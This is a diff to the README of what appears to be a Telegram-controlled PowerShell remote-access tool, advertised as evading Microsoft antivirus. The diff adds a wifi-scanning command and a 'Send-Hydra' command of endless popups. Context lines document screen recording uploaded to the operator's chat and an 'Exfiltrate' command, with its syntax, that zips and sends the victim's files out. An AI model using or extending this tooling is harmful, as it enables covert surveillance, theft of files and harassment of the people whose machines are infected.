@@ -119,6 +119,10 @@ Confirmed working with no Microsoft AV detections, on a variety of Windows syste
 
 `Record-Screen`       : Record Screen to mkv file and upload to chat. eg. `Record-Screen -t 100` in seconds
 
+`Nearby-Wifi`         : Show nearby wifi networks       
+
+`Send-Hydra`         : Never ending popups (use killswitch)   
+
 `Exfiltrate`        : Searches for, and sends, files to the chat as zip files split into 50mb each (Telegram max upload limit.)
 
  EXFILTRATION EXAMPLE COMMAND  =  `Exfiltrate -path [FOLDERS] -filetype [FILETYPES]`
